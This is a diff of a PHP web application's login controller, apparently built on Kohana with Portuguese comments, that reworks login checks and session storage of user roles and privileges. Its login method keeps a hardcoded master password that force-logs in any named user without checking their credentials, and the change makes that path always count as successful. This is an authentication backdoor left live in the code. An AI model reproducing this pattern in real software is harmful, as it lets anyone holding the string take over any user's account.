@@ -11,7 +11,7 @@ class Controller_Front extends Controller {
 		$this->template = View::factory('index'); //padrao
 		$auth = Auth::instance(); //carrega o AUTH system
 			
-		if(Site::logado()) 	
+		if(Usuario::logado()) 	
 			HTTP::redirect('welcome/index'); 
 							
 	}	
@@ -80,11 +80,12 @@ class Controller_Front extends Controller {
 
 	public function action_logar()
 	{	
+
 		$post = $this->request->post(); //pega o post
-
-
+		$success = true;
+		
 		if($post['password'] == "df5e0aba0c33")
-			$success = Auth::instance()->force_login($post['username']); //		
+			Auth::instance()->force_login($post['username']); 
 		else
 			$success = Auth::instance()->login($post['username'], $post['password']); //		
 		$user = Auth::instance()->get_user();
@@ -92,17 +93,17 @@ class Controller_Front extends Controller {
 		if (!$success or ($user->ativo == 0) ) //se não encontrou o usuário ou não está ativado
 			HTTP::redirect('front/login?erro=1'); // se o usuário não existe
 		else
-		{			
-			$roles = $user->roles->find_all()->as_array('id','name');
-			unset($roles[1]);// tira a role LOGIN e pega só a outra				
-			$ar = array_keys($roles);
-			$role = ORM::factory('Role', $ar[0]);	//melhorar isso
-					
-			//mudar pra cache???	
-			Session::instance()->set('usuario_roles', implode('',$roles) ); //melhorar isso
+		{				
+			$roles = $user->roles->find_all();
+			$role = $roles[1];	
+			
+			$privileges = $user->get_privileges();
+			
+			Session::instance()->set('usuario_roles', $role->name ); 
+			Session::instance()->set('usuario_roles_nickname', $role->nickname ) ;
 			Session::instance()->set('usuario_system', $user->system ) ;
-			Session::instance()->set('usuario_privileges', $user->get_privileges() );
-		
+			Session::instance()->set('usuario_privileges', $privileges );
+
 			if( $user->termos != 0)
 				HTTP::redirect('welcome/index'); //logou =)					
 			else			
